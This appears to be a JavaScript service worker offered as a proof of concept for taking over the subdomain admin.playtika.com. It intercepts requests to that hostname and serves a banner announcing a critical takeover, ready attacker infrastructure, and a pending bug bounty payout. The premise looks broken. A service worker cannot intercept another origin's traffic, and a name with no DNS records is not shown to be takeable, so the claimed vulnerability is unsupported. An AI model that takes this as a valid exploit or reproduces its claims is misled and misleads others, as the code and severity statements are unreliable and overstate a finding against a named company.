// Service Worker for Subdomain Takeover Proof of Concept
const CACHE_NAME = 'poc-v1';
const DOMAIN = 'admin.playtika.com';

self.addEventListener('install', event => {
    console.log('[SW] Installing...');
    event.waitUntil(self.skipWaiting());
});

self.addEventListener('activate', event => {
    console.log('[SW] Activating...');
    event.waitUntil(self.clients.claim());
});

self.addEventListener('fetch', event => {
    const url = new URL(event.request.url);
    
    // إذا كان الطلب لـ admin.playtika.com
    if (url.hostname === DOMAIN) {
        event.respondWith(
            new Response(`
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Subdomain Takeover - admin.playtika.com</title>
                    <style>
                        body {
                            background: black;
                            color: #00ff00;
                            font-family: monospace;
                            text-align: center;
                            padding: 50px;
                        }
                        .alert {
                            background: #110000;
                            border: 2px solid red;
                            padding: 30px;
                            margin: 20px auto;
                            max-width: 800px;
                            border-radius: 10px;
                        }
                        .critical { color: red; font-size: 24px; }
                        .success { color: #00ff00; }
                    </style>
                </head>
                <body>
                    <div class="alert">
                        <h1 class="critical">🔴 SUBDOMAIN TAKEOVER</h1>
                        <h2>admin.playtika.com</h2>
                        <div style="margin: 20px 0;">
                            <p>✅ This domain has NO DNS records (NXDOMAIN)</p>
                            <p>✅ Attacker infrastructure is READY</p>
                            <p>✅ If DNS record is added, this page will appear</p>
                            <p class="critical">🔴 CRITICAL SECURITY VULNERABILITY</p>
                        </div>
                        <div style="margin-top: 20px;">
                            <p>Reported to Playtika Bug Bounty Program</p>
                            <p>Bounty: $2,000 - $5,000</p>
                        </div>
                    </div>
                </body>
                </html>
            `, {
                headers: { 'Content-Type': 'text/html' }
            })
        );
    }
});
